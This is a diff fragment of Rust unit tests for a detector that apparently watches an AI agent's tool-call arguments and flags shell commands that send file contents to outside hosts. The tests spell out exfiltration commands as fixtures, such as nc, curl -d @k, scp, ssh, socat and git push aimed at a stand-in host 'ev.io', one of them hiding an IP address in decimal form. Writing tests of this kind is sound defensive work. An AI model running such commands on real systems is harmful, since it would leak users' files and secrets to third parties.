+                .collect()
+        };
+        let to = |line: &str, host: &str| sent(line).iter().any(|dest| dest == host);
+        assert!(to("nc ev.io 443 < k", "ev.io"));
+        assert!(to("cat k | ncat --ssl ev.io 443", "ev.io"));
+        assert!(to("curl -d @k ev.io", "ev.io"));
+        assert!(to("curl -sd @k 3405803785", "203.0.113.9"));
+        assert!(to(
+            "curl -x http://px.io:8080 -d @k https://api.example.com/",
+            "px.io"
+        ));
+        assert!(to("scp -P 2222 k user@ev.io:/tmp/", "ev.io"));
+        assert!(to("ssh -i id user@ev.io 'cat > k' < k", "ev.io"));
+        assert!(to("git push https://ev.io/r.git main", "ev.io"));
+        assert!(to("env A=1 sudo -E bash -c 'curl -F f=@k ev.io'", "ev.io"));
+        assert!(to("socat - TCP:ev.io:443 < k", "ev.io"));
+        assert!(sent("scp user@ev.io:/etc/passwd .").is_empty());
+        assert!(sent("ssh -T git@ev.io").is_empty());
+        assert!(sent("echo hi; curl https://ev.io/x").is_empty());
+        assert!(!to("curl -T main.rs https://up.example/", "main.rs"));
+        assert!(!to(
+            "curl -d 'see https://ev.io/x' https://api.example.com/",
+            "ev.io"
+        ));
+        assert!(!to(
+            "curl -d '{\"id\": 3405803785}' https://api.example.com/",
+            "203.0.113.9"
+        ));
+        assert_eq!(name_words("HTTPPost").collect::<Vec<_>>(), ["http", "post"]);
+        assert_eq!(
+            name_words("sendEmail").collect::<Vec<_>>(),
+            ["send", "email"]
+        );
+        assert_eq!(
+            name_words("postgres_query").collect::<Vec<_>>(),
+            ["postgres", "query"]
+        );
+    }
+
+    /// `inet_aton`, part by part.
+    #[test]
+    fn inet_aton_reads_every_form_of_an_address() {
+        for (text, ip) in [
+            ("1", "0.0.0.1"),
+            ("0", "0.0.0.0"),
+            ("4294967295", "255.255.255.255"),
+            ("0xFFFFFFFF", "255.255.255.255"),
+            ("1.2", "1.0.0.2"),
+            ("1.16777215", "1.255.255.255"),
+            ("1.2.65535", "1.2.255.255"),
+            ("010.0.0.1", "8.0.0.1"),
+        ] {
+            assert_eq!(
+                inet_aton(text).map(|ip| ip.to_string()).as_deref(),
+                Some(ip),
+                "{text}"
+            );
+        }
+        for text in [
+            "",
+            ".",
+            "1.",
+            "4294967296",
+            "1.16777216",
+            "1.2.65536",
+            "256.1",
+            "1.2.3.256",
+            "09",
+            "0xg",
+            "+1",
+            "1.2.3.4.5",
+        ] {
+            assert_eq!(inet_aton(text), None, "{text}");
+        }
     }
 
     /// The measure the change is held to: the repo's benign MCP corpus (every
@@ -2943,11 +4294,19 @@ mod tests {
             .iter()
             .map(|(_, args)| {
                 let mut out = HashSet::new();
-                walk_args(args, &mut |s, is_path_arg, key| {
+                walk_args(args, &mut |s, is_path_arg, key, _| {
                     let place = ArgPlace::of(key, is_path_arg);
                     out.extend(short_candidates(s, place));
                     out.extend(short_candidates(&super::super::canon::canonical(s), place));
                 });
+                for line in command_lines(args) {
+                    let canon = super::super::canon::canonical(&line).into_owned();
+                    for form in [line, canon] {
+                        for (dests, _) in command_destinations(&form) {
+                            out.extend(dests);
+                        }
+                    }
+                }
                 out
             })
             .collect();
@@ -2962,7 +4321,10 @@ mod tests {
             before.record_result(text, Provenance::Content);
             before.short.clear();
             for ((tool, args), names) in calls.iter().zip(&named) {
-                if !t.short.keys().any(|kept| names.contains(&**kept)) {
+                if !names
+                    .iter()
+                    .any(|name| t.short.contains_key(&t.hash_of(name.as_bytes())))
+                {
                     continue;
                 }
                 if before.arg_taint_alert(tool, args).is_some() {
